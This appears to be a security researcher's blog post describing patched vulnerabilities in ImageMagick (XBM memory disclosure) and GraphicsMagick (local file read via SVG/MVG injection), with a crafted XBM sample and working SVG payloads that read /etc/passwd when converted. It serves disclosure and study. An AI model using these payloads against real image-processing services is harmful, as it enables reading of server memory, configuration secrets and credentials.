# Security of Data processing libraries Part 2 - Exploitation


Common feature for modern web applications to save and process user files. It can be a avatar generation, file thumbnails, reports or screenshot generation. Open source data processing libraries are usually used for such purposes. There are number of known vulnerabilities at those libraries that can be used to get access to the sensitive informtation. At this article I'll show you how to get access to arbitary file on vulnerable system and lure process memory into your open arms.

<!--more-->

# Bleed attacks

Bleed vulnerabilities have typically been out-of-bounds reads, but those one are the use of uninitialized memory. An uninitialized image decode buffer is used as the basis for an image rendered back to the client. This leaks server side memory. This type of vulnerability is fairly stealthy compared to an out-of-bounds read because the server will never crash. However, the leaked secrets will be limited to those present in freed heap chunks. More detailes can be found at blog post [bleed continues: 18 byte file, $14k bounty, for leaking private Yahoo! Mail images](https://scarybeastsecurity.blogspot.com/2017/05/bleed-continues-18-byte-file-14k-bounty.html) and [exploit for ImageMagick's uninitialized memory disclosure in gif coder](https://github.com/neex/gifoeb)


# ImageMagick memory leak at XBM coder

ReadXBMImage in coders/xbm.c in ImageMagick before [7.0.8-9](https://github.com/ImageMagick/ImageMagick/commit/216d117f05bff87b9dc4db55a1b1fadb38bcb786) leaves data uninitialized when processing an XBM file that has a negative pixel value. 
If the affected code is used as a library loaded into a process that includes sensitive information, that information sometimes can be leaked via the image data. 
Exploit for ImageMagick's uninitialized memory disclosure in xbm coder.  
Auto-generation tool is [xbmdump](https://github.com/d0ge/xbmdump)

### Sample image

```text
#define -_width 16
#define -_height 16
static char -_bits[] = {
  0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, };
```

How to use:

```bash
xbmdump gen 128x128 dump.xbm
```

# Arbitary file read at TranslateTextEx GraphicsMagick 

Local file read vulnerability affects GraphicsMagick before 1.3.32. Multiple decoders that may use MVG syntaxis by default. Malicious user can get access to the local file content.
To exploit this vulnerability untrusted user file should be converted to another format with command:

```bash
gm convert exploit.svg output.png
```

exploit.svg is:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1237px" height="1237px" version="1.1"
	xmlns="http://www.w3.org/2000/svg" xmlns:xlink= "http://www.w3.org/1999/xlink">
	<image 
	xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png' text 128,128 '@/etc/passwd" 
	x="0" y="0" height="137px" width="137px"/>
</svg>
```

Exploit inject custom TextPrimitive inside ImagePrimitive at MVG coder. SVG coder when reads xlink:href attribute do not properly escape ' and any MVG commands can be injected. Function AnnotateImage(annotate.c) reads text from file with TranslateTextEx that accepts '@' as local file.

Malicious user can exploit this vulnerability at image attributes generation process for SVG coder too. 
Attributes generation process at some of the images such as SVG have issue that may allow malicious user read any local file contents.

```bash
gm convert exploit.svg output.png
```

exploit.svg is:

```xml
<?xml version="1.0" standalone="no"?>
<!--@/etc/passwd-->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1237px" height="1237px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink= " http://www.w3.org/1999/xlink"> <image 
	xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
	x="0" y="0" height="137px" width="137px"/></svg>
```

Function `SetImageAttribute(Image *image,const char *key,const char *value)` do not properly translate comments and label for this image that allow attacker to get file contents when image attributes will be written for image formats like JPEG and GIF. To reproduce vulnerability convert image:
```bash
gm convert exploit.svg output.gif
```
```bash
gm convert exploit.svg output.jpeg
```
Image attributes (comments section) will contains file contents.

# Impact

We are using /etc/passd file for our PoC. The passwd file is not really very sensitive on modern systems. But real malicious user can get access to secrets and credentials stored at configuration files. Passwords are often baked into files such as Mercurial's hgrc file.  X11's .Xauthority file might be useful on an active desktop system.


# Acknowledgement

Thanks ImageMagick and GraphicsMagick teams for the coordination and bug fixing! 

